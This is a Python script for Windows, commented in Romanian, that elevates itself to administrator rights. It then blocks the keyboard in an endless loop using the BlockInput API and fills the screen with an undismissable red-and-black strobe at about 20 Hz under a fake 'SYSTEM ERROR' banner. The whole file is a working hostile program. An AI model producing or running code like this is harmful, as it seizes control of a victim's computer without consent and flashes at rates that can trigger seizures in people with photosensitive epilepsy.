#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SPECTRE STROBE - Red/Black flickering CONTINUU
Ecran fullscreen cu pâlpâire rapidă roșu-negru + tastatură blocată
Rulează ca ADMINISTRATOR
"""

import tkinter as tk
import threading
import time
import sys
import ctypes
import os

# ============================================
# AUTO ADMIN RESTART
# ============================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
    sys.exit()

if not is_admin():
    run_as_admin()

# ============================================
# BLOCK KEYBOARD COMPLETELY
# ============================================

def block_keyboard_forever():
    """Blochează tastatura complet la infinit"""
    while True:
        try:
            # BlockInput din Windows API
            ctypes.windll.user32.BlockInput(True)
            
            # Încearcă să blocheze și cu keyboard library dacă există
            try:
                import keyboard
                keyboard.block_key('all')
            except:
                pass
                
            time.sleep(0.05)  # Reblochează la fiecare 50ms
        except:
            pass

# ============================================
# STROBE SCREEN - Pâlpâire CONTINUĂ roșu-negru
# ============================================

class StrobeScreen:
    def __init__(self, frequency_hz=10):
        """
        frequency_hz = câte schimbări pe secundă
        exemplu: 10 = 5 schimbări roșu + 5 schimbări negru = 10 flick-uri/sec
        """
        self.frequency = frequency_hz
        self.delay_ms = int(1000 / (frequency_hz * 2))  # Împărțim la 2 pentru că avem 2 stări
        
        self.root = tk.Tk()
        self.w = self.root.winfo_screenwidth()
        self.h = self.root.winfo_screenheight()
        
        # Configurare fereastră - fullscreen absolut
        self.root.configure(background="red")
        self.root.overrideredirect(True)
        self.root.geometry(f"{self.w}x{self.h}+0+0")
        self.root.attributes("-topmost", True)
        self.root.attributes("-fullscreen", True)
        self.root.focus_force()
        self.root.grab_set()
        
        # Prevenim orice închidere
        self.root.bind("<Key>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Stare inițială
        self.is_red = True
        self.strobe_running = True
        
        # Adăugăm un label ca să nu fie ecranul complet gol
        self.label = tk.Label(self.root, 
                             text="⚠️ SYSTEM ERROR ⚠️", 
                             font=("Segoe UI", 56, "bold"),
                             fg="white")
        self.label.place(relx=0.5, rely=0.5, anchor="center")
        
        # Pornim pâlpâirea
        self.strobe()
        
    def strobe(self):
        """Pâlpâire CONTINUĂ între roșu și negru"""
        if self.strobe_running:
            if self.is_red:
                self.root.configure(background="black")
                self.label.config(bg="black", fg="red")
            else:
                self.root.configure(background="red")
                self.label.config(bg="red", fg="white")
            
            self.is_red = not self.is_red
            self.root.after(self.delay_ms, self.strobe)
    
    def run(self):
        """Pornește main loop-ul"""
        self.root.mainloop()

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    # Pornim blocarea tastaturii
    threading.Thread(target=block_keyboard_forever, daemon=True).start()
    
    # Pornim STROBE-UL cu frecvență mare
    # frequency_hz = 20 înseamnă 10 schimbări roșu + 10 schimbări negru = 20 flick-uri/sec
    strobe = StrobeScreen(frequency_hz=20)  # Poți modifica între 5 și 50
    strobe.run()